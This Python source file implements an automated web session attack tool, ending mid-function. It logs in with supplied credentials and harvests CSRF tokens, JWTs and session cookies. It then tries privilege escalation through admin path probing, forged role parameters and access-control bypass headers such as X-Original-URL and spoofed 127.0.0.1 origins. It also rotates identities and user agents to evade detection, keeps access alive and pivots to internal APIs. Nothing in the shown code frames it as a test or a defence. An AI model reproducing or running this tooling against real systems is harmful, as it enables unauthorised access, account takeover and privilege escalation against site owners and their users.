# utils/ai_session_manager.py
import asyncio
import hashlib
import json
import re
import time
import uuid
from dataclasses import dataclass, field
from enum import Enum
from http.cookiejar import CookieJar
from typing import Any, Callable, Optional
from urllib.parse import urljoin, urlparse

import aiohttp
from aiohttp import ClientSession, TCPConnector, CookieJar as AiohttpCookieJar


class SessionCommand(Enum):
    ELEVATE_PRIVILEGE  = "elevate_privilege"
    MAINTAIN_ACCESS    = "maintain_access"
    ROTATE_IDENTITY    = "rotate_identity"
    REFRESH_TOKEN      = "refresh_token"
    ESCALATE_HEADERS   = "escalate_headers"
    REAUTH             = "reauth"
    CLONE_SESSION      = "clone_session"
    PIVOT_ENDPOINT     = "pivot_endpoint"


class SessionState(Enum):
    UNAUTHENTICATED  = "unauthenticated"
    AUTHENTICATING   = "authenticating"
    AUTHENTICATED    = "authenticated"
    ELEVATED         = "elevated"
    EXPIRED          = "expired"
    ROTATING         = "rotating"
    PIVOTED          = "pivoted"
    DEAD             = "dead"


class PrivilegeLevel(Enum):
    ANONYMOUS  = 0
    USER       = 1
    MODERATOR  = 2
    ADMIN      = 3
    SUPERADMIN = 4
    ROOT       = 5


class TokenType(Enum):
    CSRF            = "csrf"
    JWT             = "jwt"
    BEARER          = "bearer"
    API_KEY         = "api_key"
    REFRESH         = "refresh"
    OAUTH_ACCESS    = "oauth_access"
    OAUTH_REFRESH   = "oauth_refresh"
    SESSION_COOKIE  = "session_cookie"
    NONCE           = "nonce"
    XSRF            = "xsrf"


@dataclass
class CapturedToken:
    token_type: TokenType
    value: str
    source: str
    captured_at: float = field(default_factory=time.monotonic)
    expires_at: Optional[float] = None
    header_name: Optional[str] = None
    cookie_name: Optional[str] = None
    param_name: Optional[str] = None

    def is_expired(self) -> bool:
        if self.expires_at is None:
            return False
        return time.monotonic() > self.expires_at


@dataclass
class IdentityProfile:
    identity_id: str
    username: str
    password: str
    email: str
    user_agent: str
    accept_language: str
    extra_headers: dict[str, str] = field(default_factory=dict)
    proxy: Optional[str] = None
    created_at: float = field(default_factory=time.monotonic)
    privilege_level: PrivilegeLevel = PrivilegeLevel.ANONYMOUS


@dataclass
class RequestRecord:
    method: str
    url: str
    headers: dict[str, str]
    cookies: dict[str, str]
    body: Optional[str]
    response_status: int
    response_headers: dict[str, str]
    response_snippet: str
    duration_ms: float
    timestamp: float


@dataclass
class SessionSnapshot:
    snapshot_id: str
    state: SessionState
    privilege_level: PrivilegeLevel
    cookies: dict[str, str]
    tokens: list[CapturedToken]
    headers: dict[str, str]
    identity: IdentityProfile
    request_history: list[RequestRecord]
    created_at: float = field(default_factory=time.monotonic)


@dataclass
class CommandResult:
    command: SessionCommand
    success: bool
    state_before: SessionState
    state_after: SessionState
    privilege_before: PrivilegeLevel
    privilege_after: PrivilegeLevel
    actions_taken: list[str]
    new_tokens: list[CapturedToken]
    duration_ms: float
    detail: str


@dataclass
class SessionReport:
    session_id: str
    target_url: str
    final_state: SessionState
    final_privilege: PrivilegeLevel
    identities_used: list[str]
    commands_executed: list[CommandResult]
    request_count: int
    token_captures: list[CapturedToken]
    snapshots: list[SessionSnapshot]
    pivots: list[str]
    high_value_cookies: list[str]
    high_value_headers: list[str]
    auth_endpoints_discovered: list[str]
    duration_seconds: float


USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
]

ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-US,en;q=0.8,th;q=0.6",
    "en-US,en;q=0.9,fr;q=0.8",
]

HIGH_VALUE_COOKIE_NAMES = {
    "session", "sess", "sessionid", "session_id", "sid", "phpsessid",
    "jsessionid", "asp.net_sessionid", "auth", "auth_token", "authtoken",
    "access_token", "token", "jwt", "remember_me", "rememberme",
    "admin_session", "admin_token", "user_token", "api_token",
}

HIGH_VALUE_HEADER_NAMES = {
    "x-auth-token", "authorization", "x-api-key", "x-access-token",
    "x-session-token", "x-csrf-token", "x-xsrf-token", "x-user-token",
    "x-admin-key", "x-internal-token", "x-service-key",
}

CSRF_TOKEN_PATTERNS = [
    re.compile(r'<input[^>]+name=["\']?(_token|csrf_token|csrfmiddlewaretoken|authenticity_token|__RequestVerificationToken|_csrf)["\']?[^>]+value=["\']([^"\']{8,})["\']', re.IGNORECASE),
    re.compile(r'<meta[^>]+name=["\']?(csrf-token|_token|csrf_param)["\']?[^>]+content=["\']([^"\']{8,})["\']', re.IGNORECASE),
    re.compile(r'"csrfToken"\s*:\s*"([^"]{8,})"', re.IGNORECASE),
    re.compile(r'"_token"\s*:\s*"([^"]{8,})"', re.IGNORECASE),
    re.compile(r'csrfmiddlewaretoken.*?value=["\']([^"\']{8,})["\']', re.IGNORECASE),
    re.compile(r'var\s+(?:csrf|_token|csrfToken)\s*=\s*["\']([^"\']{8,})["\']', re.IGNORECASE),
]

NONCE_PATTERNS = [
    re.compile(r'<input[^>]+name=["\']?nonce["\']?[^>]+value=["\']([^"\']{6,})["\']', re.IGNORECASE),
    re.compile(r'"nonce"\s*:\s*"([^"]{6,})"'),
]

JWT_PATTERN = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')

LOGIN_ENDPOINT_PATTERNS = [
    re.compile(r'action=["\']([^"\']*(?:login|signin|auth|authenticate|session)[^"\']*)["\']', re.IGNORECASE),
    re.compile(r'<form[^>]+(?:login|signin|auth)[^>]*>.*?</form>', re.IGNORECASE | re.DOTALL),
]

PRIVILEGE_SIGNALS: dict[PrivilegeLevel, list[str]] = {
    PrivilegeLevel.ADMIN:      ["admin", "administrator", "dashboard", "manage", "control panel", "settings", "user management"],
    PrivilegeLevel.MODERATOR:  ["moderator", "mod panel", "reports", "flag", "review queue"],
    PrivilegeLevel.USER:       ["profile", "account", "logout", "my account", "dashboard"],
    PrivilegeLevel.SUPERADMIN: ["superadmin", "super admin", "root access", "system settings", "debug"],
}

ELEVATION_PATHS = [
    "/admin", "/admin/", "/admin/dashboard", "/admin/users", "/administrator",
    "/manage", "/management", "/control", "/panel", "/staff",
    "/api/admin", "/api/v1/admin", "/internal", "/debug", "/system",
    "/wp-admin", "/wp-admin/", "/cpanel", "/plesk", "/phpmyadmin",
    "/user/admin", "/account/admin", "/dashboard/admin",
]

REFRESH_TOKEN_ENDPOINTS = [
    "/api/refresh", "/api/token/refresh", "/auth/refresh", "/oauth/token",
    "/api/v1/auth/refresh", "/api/v2/token/refresh", "/refresh_token",
    "/api/auth/refresh", "/token/refresh",
]

PIVOT_ENDPOINT_DISCOVERY = [
    "/api/", "/api/v1/", "/api/v2/", "/graphql", "/graphql/",
    "/internal/api/", "/admin/api/", "/service/", "/microservice/",
    "/backend/", "/proxy/", "/forward/",
]


def _build_identity(username: str, password: str, email: str = "", ua_idx: int = 0) -> IdentityProfile:
    return IdentityProfile(
        identity_id=str(uuid.uuid4())[:8],
        username=username,
        password=password,
        email=email or f"{username}@example.com",
        user_agent=USER_AGENTS[ua_idx % len(USER_AGENTS)],
        accept_language=ACCEPT_LANGUAGES[ua_idx % len(ACCEPT_LANGUAGES)],
    )


def _extract_tokens_from_html(html: str, source_url: str) -> list[CapturedToken]:
    tokens: list[CapturedToken] = []
    for pattern in CSRF_TOKEN_PATTERNS:
        match = pattern.search(html)
        if match:
            groups = match.groups()
            value = groups[-1]
            tokens.append(CapturedToken(
                token_type=TokenType.CSRF,
                value=value,
                source=source_url,
                param_name=groups[0] if len(groups) > 1 else "_token",
            ))
            break
    for pattern in NONCE_PATTERNS:
        match = pattern.search(html)
        if match:
            tokens.append(CapturedToken(
                token_type=TokenType.NONCE,
                value=match.group(1),
                source=source_url,
            ))
            break
    for match in JWT_PATTERN.finditer(html):
        tokens.append(CapturedToken(
            token_type=TokenType.JWT,
            value=match.group(0),
            source=source_url,
        ))
    return tokens


def _extract_tokens_from_headers(headers: dict[str, str], source_url: str) -> list[CapturedToken]:
    tokens: list[CapturedToken] = []
    header_map = {k.lower(): v for k, v in headers.items()}
    if "x-csrf-token" in header_map:
        tokens.append(CapturedToken(
            token_type=TokenType.CSRF, value=header_map["x-csrf-token"],
            source=source_url, header_name="X-CSRF-Token",
        ))
    if "x-xsrf-token" in header_map:
        tokens.append(CapturedToken(
            token_type=TokenType.XSRF, value=header_map["x-xsrf-token"],
            source=source_url, header_name="X-XSRF-Token",
        ))
    if "authorization" in header_map:
        val = header_map["authorization"]
        ttype = TokenType.JWT if val.lower().startswith("bearer ") else TokenType.BEARER
        tokens.append(CapturedToken(
            token_type=ttype, value=val, source=source_url, header_name="Authorization",
        ))
    return tokens


def _infer_privilege_from_response(html: str, url: str) -> PrivilegeLevel:
    html_lower = html.lower()
    for level in [PrivilegeLevel.SUPERADMIN, PrivilegeLevel.ROOT, PrivilegeLevel.ADMIN, PrivilegeLevel.MODERATOR, PrivilegeLevel.USER]:
        signals = PRIVILEGE_SIGNALS.get(level, [])
        if any(sig in html_lower for sig in signals):
            return level
    return PrivilegeLevel.ANONYMOUS


def _build_session_headers(identity: IdentityProfile, extra: dict[str, str] = {}) -> dict[str, str]:
    headers = {
        "User-Agent": identity.user_agent,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": identity.accept_language,
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }
    headers.update(identity.extra_headers)
    headers.update(extra)
    return headers


def _extract_login_form_params(html: str) -> dict[str, str]:
    params: dict[str, str] = {}
    input_pattern = re.compile(r'<input[^>]+>', re.IGNORECASE)
    name_pattern = re.compile(r'name=["\']?([^"\'>\s]+)["\']?', re.IGNORECASE)
    value_pattern = re.compile(r'value=["\']?([^"\'>\s]*)["\']?', re.IGNORECASE)
    type_pattern = re.compile(r'type=["\']?([^"\'>\s]+)["\']?', re.IGNORECASE)
    for input_tag in input_pattern.finditer(html):
        tag = input_tag.group(0)
        name_m = name_pattern.search(tag)
        value_m = value_pattern.search(tag)
        type_m = type_pattern.search(tag)
        if name_m:
            name = name_m.group(1)
            value = value_m.group(1) if value_m else ""
            itype = (type_m.group(1) if type_m else "text").lower()
            if itype not in ("submit", "button", "image", "reset"):
                params[name] = value
    return params


def _detect_auth_endpoint(html: str, base_url: str) -> Optional[str]:
    for pattern in LOGIN_ENDPOINT_PATTERNS:
        match = pattern.search(html)
        if match and match.lastindex:
            action = match.group(1)
            if action:
                return urljoin(base_url, action)
    return None


class SessionManager:
    def __init__(
        self,
        target_url: str,
        credentials: list[dict],
        commands: list[str],
        delay: float = 0.3,
        max_redirects: int = 10,
        timeout: int = 20,
        proxy: Optional[str] = None,
    ):
        self.target_url = target_url.rstrip("/")
        self.base_domain = urlparse(target_url).netloc
        self.credentials = credentials
        self.commands = [SessionCommand(c) for c in commands if c in [e.value for e in SessionCommand]]
        self.delay = delay
        self.max_redirects = max_redirects
        self.timeout = timeout
        self.proxy = proxy

        self.session_id = str(uuid.uuid4())[:12]
        self.state = SessionState.UNAUTHENTICATED
        self.privilege_level = PrivilegeLevel.ANONYMOUS
        self.identities: list[IdentityProfile] = []
        self.active_identity_idx: int = 0
        self.tokens: list[CapturedToken] = []
        self.extra_request_headers: dict[str, str] = {}
        self.request_history: list[RequestRecord] = []
        self.snapshots: list[SessionSnapshot] = []
        self.command_results: list[CommandResult] = []
        self.auth_endpoints: list[str] = []
        self.pivots: list[str] = []
        self._http: Optional[ClientSession] = None
        self._start_time: float = 0.0

        for idx, cred in enumerate(credentials):
            self.identities.append(_build_identity(
                username=cred.get("username", ""),
                password=cred.get("password", ""),
                email=cred.get("email", ""),
                ua_idx=idx,
            ))

    @property
    def _active_identity(self) -> IdentityProfile:
        return self.identities[self.active_identity_idx % len(self.identities)]

    def _snapshot(self) -> SessionSnapshot:
        cookies = {}
        if self._http and self._http.cookie_jar:
            for cookie in self._http.cookie_jar:
                cookies[cookie.key] = cookie.value
        return SessionSnapshot(
            snapshot_id=str(uuid.uuid4())[:8],
            state=self.state,
            privilege_level=self.privilege_level,
            cookies=cookies,
            tokens=list(self.tokens),
            headers=dict(self.extra_request_headers),
            identity=self._active_identity,
            request_history=list(self.request_history[-20:]),
        )

    def _get_csrf_token(self) -> Optional[CapturedToken]:
        for tok in reversed(self.tokens):
            if tok.token_type in (TokenType.CSRF, TokenType.XSRF, TokenType.NONCE) and not tok.is_expired():
                return tok
        return None

    def _get_jwt(self) -> Optional[CapturedToken]:
        for tok in reversed(self.tokens):
            if tok.token_type in (TokenType.JWT, TokenType.BEARER, TokenType.OAUTH_ACCESS) and not tok.is_expired():
                return tok
        return None

    def _build_request_headers(self, extra: dict[str, str] = {}) -> dict[str, str]:
        headers = _build_session_headers(self._active_identity, self.extra_request_headers)
        jwt = self._get_jwt()
        if jwt and jwt.header_name:
            headers[jwt.header_name] = jwt.value
        elif jwt:
            headers["Authorization"] = f"Bearer {jwt.value}" if not jwt.value.lower().startswith("bearer") else jwt.value
        headers.update(extra)
        return headers

    async def _request(
        self,
        method: str,
        url: str,
        extra_headers: dict[str, str] = {},
        data: Optional[dict] = None,
        json_body: Optional[dict] = None,
        allow_redirects: bool = True,
    ) -> tuple[int, dict[str, str], str]:
        if not self._http:
            return 0, {}, ""
        await asyncio.sleep(self.delay)
        t0 = time.monotonic()
        headers = self._build_request_headers(extra_headers)
        try:
            kwargs: dict[str, Any] = {
                "headers": headers,
                "allow_redirects": allow_redirects,
                "timeout": aiohttp.ClientTimeout(total=self.timeout),
                "ssl": False,
                "max_redirects": self.max_redirects,
            }
            if self.proxy:
                kwargs["proxy"] = self.proxy
            if data is not None:
                kwargs["data"] = data
            if json_body is not None:
                kwargs["json"] = json_body
            async with self._http.request(method, url, **kwargs) as resp:
                status = resp.status
                resp_headers = dict(resp.headers)
                try:
                    body = await resp.text(errors="replace")
                except Exception:
                    body = ""
                duration = (time.monotonic() - t0) * 1000
                self.request_history.append(RequestRecord(
                    method=method, url=url, headers=headers,
                    cookies={c.key: c.value for c in self._http.cookie_jar},
                    body=json.dumps(json_body) if json_body else (str(data) if data else None),
                    response_status=status, response_headers=resp_headers,
                    response_snippet=body[:500], duration_ms=round(duration, 2),
                    timestamp=time.time(),
                ))
                new_tokens = _extract_tokens_from_html(body, url)
                new_tokens += _extract_tokens_from_headers(resp_headers, url)
                self.tokens.extend(new_tokens)
                xsrf_cookie = None
                for cookie in self._http.cookie_jar:
                    if cookie.key.lower() in ("xsrf-token", "csrf-token", "_xsrf"):
                        xsrf_cookie = cookie.value
                if xsrf_cookie:
                    self.tokens.append(CapturedToken(
                        token_type=TokenType.XSRF, value=xsrf_cookie,
                        source=url, cookie_name=cookie.key,
                    ))
                return status, resp_headers, body
        except Exception as e:
            duration = (time.monotonic() - t0) * 1000
            self.request_history.append(RequestRecord(
                method=method, url=url, headers=headers, cookies={},
                body=None, response_status=0, response_headers={},
                response_snippet=str(e)[:200], duration_ms=round(duration, 2),
                timestamp=time.time(),
            ))
            return 0, {}, ""

    async def _probe_target(self) -> str:
        status, headers, html = await self._request("GET", self.target_url)
        if status == 0:
            return ""
        endpoint = _detect_auth_endpoint(html, self.target_url)
        if endpoint and endpoint not in self.auth_endpoints:
            self.auth_endpoints.append(endpoint)
        return html

    async def _authenticate(self) -> bool:
        self.state = SessionState.AUTHENTICATING
        identity = self._active_identity
        if not self.auth_endpoints:
            await self._probe_target()
        if not self.auth_endpoints:
            common = ["/login", "/signin", "/auth/login", "/user/login", "/account/login", "/api/login", "/api/auth"]
            for path in common:
                url = self.target_url + path
                status, _, html = await self._request("GET", url)
                if status in (200, 302) and html:
                    endpoint = _detect_auth_endpoint(html, url) or url
                    if endpoint not in self.auth_endpoints:
                        self.auth_endpoints.append(endpoint)
                    if _get_csrf := self._get_csrf_token():
                        break

        for endpoint in self.auth_endpoints[:3]:
            status_get, _, html_get = await self._request("GET", endpoint)
            if status_get == 0:
                continue
            form_params = _extract_login_form_params(html_get)
            csrf = self._get_csrf_token()
            post_data: dict[str, str] = {}
            post_data.update(form_params)
            username_keys = [k for k in form_params if any(x in k.lower() for x in ("user", "email", "login", "name", "account"))]
            password_keys = [k for k in form_params if any(x in k.lower() for x in ("pass", "pwd", "secret", "credential"))]
            if username_keys:
                post_data[username_keys[0]] = identity.username
            else:
                post_data["username"] = identity.username
            if password_keys:
                post_data[password_keys[0]] = identity.password
            else:
                post_data["password"] = identity.password
            if csrf:
                post_data[csrf.param_name or "_token"] = csrf.value
            status_post, resp_headers, html_post = await self._request(
                "POST", endpoint, data=post_data,
                extra_headers={"Referer": endpoint, "Content-Type": "application/x-www-form-urlencoded"},
            )
            if status_post in (200, 302):
                detected = _infer_privilege_from_response(html_post, endpoint)
                if detected != PrivilegeLevel.ANONYMOUS:
                    self.state = SessionState.AUTHENTICATED
                    self.privilege_level = detected
                    self._active_identity.privilege_level = detected
                    self.snapshots.append(self._snapshot())
                    return True
                high_cookies = [
                    c.key for c in self._http.cookie_jar
                    if c.key.lower() in HIGH_VALUE_COOKIE_NAMES
                ]
                if high_cookies:
                    self.state = SessionState.AUTHENTICATED
                    self.privilege_level = PrivilegeLevel.USER
                    self._active_identity.privilege_level = PrivilegeLevel.USER
                    self.snapshots.append(self._snapshot())
                    return True
        return False

    async def _cmd_elevate_privilege(self) -> CommandResult:
        t0 = time.monotonic()
        actions: list[str] = []
        state_before = self.state
        priv_before = self.privilege_level
        new_tokens: list[CapturedToken] = []

        for path in ELEVATION_PATHS:
            url = self.target_url + path
            status, headers, html = await self._request("GET", url)
            if status in (200, 201):
                actions.append(f"probe_elevation: GET {url} → {status}")
                detected = _infer_privilege_from_response(html, url)
                if detected.value > self.privilege_level.value:
                    self.privilege_level = detected
                    self._active_identity.privilege_level = detected
                    self.state = SessionState.ELEVATED
                    actions.append(f"privilege_elevated: {priv_before.name} → {detected.name}")
                    break

        cookie_names = [c.key for c in self._http.cookie_jar]
        for c in self._http.cookie_jar:
            if c.key.lower() in HIGH_VALUE_COOKIE_NAMES:
                new_tokens.append(CapturedToken(
                    token_type=TokenType.SESSION_COOKIE,
                    value=c.value, source=self.target_url, cookie_name=c.key,
                ))

        for endpoint in self.auth_endpoints[:2]:
            test_params = [
                {"role": "admin"}, {"is_admin": "1"}, {"privilege": "admin"},
                {"user_type": "admin"}, {"level": "5"},
            ]
            for params in test_params:
                csrf = self._get_csrf_token()
                if csrf:
                    params[csrf.param_name or "_token"] = csrf.value
                s, h, body = await self._request("POST", endpoint, data=params)
                if s in (200, 302):
                    detected = _infer_privilege_from_response(body, endpoint)
                    if detected.value > self.privilege_level.value:
                        self.privilege_level = detected
                        self.state = SessionState.ELEVATED
                        actions.append(f"param_elevation_success: {params} → {detected.name}")
                        break

        self.snapshots.append(self._snapshot())
        return CommandResult(
            command=SessionCommand.ELEVATE_PRIVILEGE,
            success=self.state == SessionState.ELEVATED,
            state_before=state_before, state_after=self.state,
            privilege_before=priv_before, privilege_after=self.privilege_level,
            actions_taken=actions, new_tokens=new_tokens,
            duration_ms=round((time.monotonic() - t0) * 1000, 2),
            detail=f"final privilege: {self.privilege_level.name}",
        )

    async def _cmd_maintain_access(self) -> CommandResult:
        t0 = time.monotonic()
        actions: list[str] = []
        state_before = self.state
        priv_before = self.privilege_level
        new_tokens: list[CapturedToken] = []

        status, headers, html = await self._request("GET", self.target_url)
        if status in (200, 302):
            actions.append(f"heartbeat: GET {self.target_url} → {status}")
            if _infer_privilege_from_response(html, self.target_url) == PrivilegeLevel.ANONYMOUS:
                reauth = await self._authenticate()
                actions.append(f"reauth_triggered: success={reauth}")

        for endpoint in REFRESH_TOKEN_ENDPOINTS:
            url = self.target_url + endpoint
            refresh_tok = next((t for t in reversed(self.tokens) if t.token_type == TokenType.REFRESH), None)
            payload: dict[str, Any] = {}
            if refresh_tok:
                payload["refresh_token"] = refresh_tok.value
            csrf = self._get_csrf_token()
            if csrf:
                payload[csrf.param_name or "_token"] = csrf.value
            s, h, body = await self._request("POST", url, json_body=payload if payload else None)
            if s in (200, 201):
                actions.append(f"token_refresh: POST {url} → {s}")
                new_tokens += _extract_tokens_from_html(body, url)
                jwt_match = JWT_PATTERN.search(body)
                if jwt_match:
                    new_tokens.append(CapturedToken(
                        token_type=TokenType.JWT, value=jwt_match.group(0), source=url,
                    ))
                    self.tokens.extend(new_tokens)
                break

        for path in ["/api/ping", "/api/heartbeat", "/api/v1/ping", "/api/keep_alive"]:
            url = self.target_url + path
            s, _, _ = await self._request("GET", url)
            if s == 200:
                actions.append(f"keepalive: {url} → {s}")
                break

        self.snapshots.append(self._snapshot())
        return CommandResult(
            command=SessionCommand.MAINTAIN_ACCESS,
            success=self.state in (SessionState.AUTHENTICATED, SessionState.ELEVATED),
            state_before=state_before, state_after=self.state,
            privilege_before=priv_before, privilege_after=self.privilege_level,
            actions_taken=actions, new_tokens=new_tokens,
            duration_ms=round((time.monotonic() - t0) * 1000, 2),
            detail=f"session alive: {self.state.name}",
        )

    async def _cmd_rotate_identity(self) -> CommandResult:
        t0 = time.monotonic()
        state_before = self.state
        priv_before = self.privilege_level
        actions: list[str] = []
        new_tokens: list[CapturedToken] = []

        old_idx = self.active_identity_idx
        self.active_identity_idx = (self.active_identity_idx + 1) % max(len(self.identities), 1)
        old_id = self.identities[old_idx % len(self.identities)]
        new_id = self._active_identity
        actions.append(f"identity_rotate: {old_id.username} → {new_id.username} ua_change={old_id.user_agent != new_id.user_agent}")

        if self._http:
            await self._http.close()
        connector = TCPConnector(ssl=False, limit=10)
        jar = AiohttpCookieJar()
        self._http = ClientSession(connector=connector, cookie_jar=jar)
        self.tokens = [t for t in self.tokens if t.token_type not in (TokenType.SESSION_COOKIE,)]
        self.state = SessionState.ROTATING
        actions.append("cookie_jar_cleared: new session context")

        reauth = await self._authenticate()
        actions.append(f"reauth_post_rotate: success={reauth}")
        new_tokens += [t for t in self.tokens if t.token_type == TokenType.SESSION_COOKIE]

        self.snapshots.append(self._snapshot())
        return CommandResult(
            command=SessionCommand.ROTATE_IDENTITY,
            success=reauth,
            state_before=state_before, state_after=self.state,
            privilege_before=priv_before, privilege_after=self.privilege_level,
            actions_taken=actions, new_tokens=new_tokens,
            duration_ms=round((time.monotonic() - t0) * 1000, 2),
            detail=f"new identity: {new_id.username}, privilege: {self.privilege_level.name}",
        )

    async def _cmd_refresh_token(self) -> CommandResult:
        t0 = time.monotonic()
        state_before = self.state
        priv_before = self.privilege_level
        actions: list[str] = []
        new_tokens: list[CapturedToken] = []

        for endpoint in REFRESH_TOKEN_ENDPOINTS:
            url = self.target_url + endpoint
            refresh = next((t for t in reversed(self.tokens) if t.token_type == TokenType.REFRESH), None)
            csrf = self._get_csrf_token()
            payload: dict[str, Any] = {}
            if refresh:
                payload["refresh_token"] = refresh.value
                payload["grant_type"] = "refresh_token"
            if csrf:
                payload[csrf.param_name or "_token"] = csrf.value
            s, h, body = await self._request("POST", url, json_body=payload or None,
                                             extra_headers={"Content-Type": "application/json"})
            if s in (200, 201) and body:
                actions.append(f"refresh_success: POST {url} → {s}")
                extracted = _extract_tokens_from_html(body, url)
                try:
                    parsed = json.loads(body)
                    if "access_token" in parsed:
                        new_tokens.append(CapturedToken(
                            token_type=TokenType.OAUTH_ACCESS, value=parsed["access_token"],
                            source=url, header_name="Authorization",
                        ))
                        self.extra_request_headers["Authorization"] = f"Bearer {parsed['access_token']}"
                    if "refresh_token" in parsed:
                        new_tokens.append(CapturedToken(
                            token_type=TokenType.REFRESH, value=parsed["refresh_token"], source=url,
                        ))
                except (json.JSONDecodeError, ValueError):
                    pass
                new_tokens += extracted
                self.tokens.extend(new_tokens)
                break

        status, _, html = await self._request("GET", self.target_url)
        new_tokens += _extract_tokens_from_html(html, self.target_url)
        self.tokens.extend(new_tokens)
        self.snapshots.append(self._snapshot())
        return CommandResult(
            command=SessionCommand.REFRESH_TOKEN,
            success=bool(new_tokens),
            state_before=state_before, state_after=self.state,
            privilege_before=priv_before, privilege_after=self.privilege_level,
            actions_taken=actions, new_tokens=new_tokens,
            duration_ms=round((time.monotonic() - t0) * 1000, 2),
            detail=f"tokens refreshed: {len(new_tokens)}",
        )

    async def _cmd_escalate_headers(self) -> CommandResult:
        t0 = time.monotonic()
        state_before = self.state
        priv_before = self.privilege_level
        actions: list[str] = []
        new_tokens: list[CapturedToken] = []

        escalation_header_sets = [
            {"X-Original-URL": "/admin", "X-Rewrite-URL": "/admin"},
            {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1", "X-Remote-Addr": "127.0.0.1"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"X-Host": "localhost"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Admin": "1", "X-Internal": "1"},
            {"X-Role": "admin", "X-User-Role": "administrator"},
            {"X-Auth-User": "admin", "X-Auth-Groups": "admin,staff,superuser"},
            {"X-Override-Role": "admin"},
            {"X-Acl-Group": "admin"},
            {"X-Access-Level": "9", "X-Permission-Level": "255"},
        ]

        probe_urls = [self.target_url] + [self.target_url + p for p in ELEVATION_PATHS[:5]]

        for probe_url in probe_urls[:3]:
            for hset in escalation_header_sets:
                s, _, html = await self._request("GET", probe_url, extra_headers=hset)
                if s in (200, 201):
                    detected = _infer_privilege_from_response(html, probe_url)
                    if detected.value > self.privilege_level.value:
                        self.extra_request_headers.update(hset)
                        self.privilege_level = detected
                        self.state = SessionState.ELEVATED
                        actions.append(f"header_escalation_success: {hset} → {detected.name}")
                        break
                await asyncio.sleep(0.1)

        self.snapshots.append(self._snapshot())
        return CommandResult(
            command=SessionCommand.ESCALATE_HEADERS,
            success=self.state == SessionState.ELEVATED,
            state_before=state_before, state_after=self.state,
            privilege_before=priv_before, privilege_after=self.privilege_level,
            actions_taken=actions, new_tokens=new_tokens,
            duration_ms=round((time.monotonic() - t0) * 1000, 2),
            detail=f"injected headers: {list(self.extra_request_headers.keys())}",
        )

    async def _cmd_pivot_endpoint(self) -> CommandResult:
        t0 = time.monotonic()
        state_before = self.state
        priv_before = self.privilege_level
        actions: list[str] = []
        new_tokens: list[CapturedToken] = []

        for path in PIVOT_ENDPOINT_DISCOVERY:
            url = self.target_url + path
            s, headers, html = await self._request("GET", url)
            if s in (200, 201, 403) and html:
                self.pivots.append(url)
                actions.append(f"pivot_discovered: {url} → {s}")
                internal_links = re.findall(r'href=["\']([^"\']+)["\']', html)
                for link in internal_links[:10]:
                    if link.startswith("/") or urlparse(link).netloc == self.base_domain:
                        full = urljoin(self.target_url, link)
                        if full not in self.pivots:
                            s2, _, h2 = await self._request("GET", full)
                            if s2 in (200, 201):
                                detected = _infer_privilege_from_response(h2, full)
                                if detected.value > self.privilege_level.value:
                                    self.privilege_level = detected
                                    self.state = SessionState.PIVOTED
                                    actions.append(f"pivot_elevation: {full} → {detected.name}")

        self.snapshots.append(self._snapshot())
        return CommandResult(
            command=SessionCommand.PIVOT_ENDPOINT,
            success=bool(self.pivots),
            state_before=state_before, state_after=self.state,
            privilege_before=priv_before, privilege_after=self.privilege_level,
            actions_taken=actions, new_tokens=new_tokens,
            duration_ms=round((time.monotonic() - t0) * 1000, 2),
            detail=f"pivots found: {len(self.pivots)}",
        )

    async def _cmd_clone_session(self) -> CommandResult:
        t0 = time.monotonic()
        state_before = self.state
        priv_before = self.privilege_level
        actions: list[str] = []
        snapshot = self._snapshot()
        self.snapshots.append(snapshot)
        actions.append(f"session_cloned: snapshot_id={snapshot.snapshot_id} cookies={len(snapshot.cookies)} tokens={len(snapshot.tokens)}")
        return CommandResult(
            command=SessionCommand.CLONE_SESSION,
            success=True,
            state_before=state_before, state_after=self.state,
            privilege_before=priv_before, privilege_after=self.privilege_level,
            actions_taken=actions, new_tokens=[],
            duration_ms=round((time.monotonic() - t0) * 1000, 2),
            detail=f"snapshot: {snapshot.snapshot_id}",
        )

    async def _execute_command(self, cmd: SessionCommand) -> CommandResult:
        dispatch: dict[SessionCommand, Callable] = {
            SessionCommand.ELEVATE_PRIVILEGE:  self._cmd_elevate_privilege,
            SessionCommand.MAINTAIN_ACCESS:    self._cmd_maintain_access,
            SessionCommand.ROTATE_IDENTITY:    self._cmd_rotate_identity,
            SessionCommand.REFRESH_TOKEN:      self._cmd_refresh_token,
            SessionCommand.ESCALATE_HEADERS:   self._cmd_escalate_headers,
            SessionCommand.REAUTH:             self._authenticate_as_command,
            SessionCommand.CLONE_SESSION:      self._cmd_clone_session,
            SessionCommand.PIVOT_ENDPOINT:     self._cmd_pivot_endpoint,
        }
        handler = dispatch.get(cmd)
        if not handler:
            return CommandResult(
                command=cmd, success=False,
                state_before=self.state, state_after=self.state,
                privilege_before=self.privilege_level, privilege_after=self.privilege_level,
                actions_taken=[], new_tokens=[],
                duration_ms=0.0, detail=f"no handler for {cmd.value}",
            )
        return await handler()

    async def _authenticate_as_command(self) -> CommandResult:
        t0 = time.monotonic()
        state_before = self.state
        priv_before = self.privilege_level
        success = await self._authenticate()
        return CommandResult(
            command=SessionCommand.REAUTH, success=success,
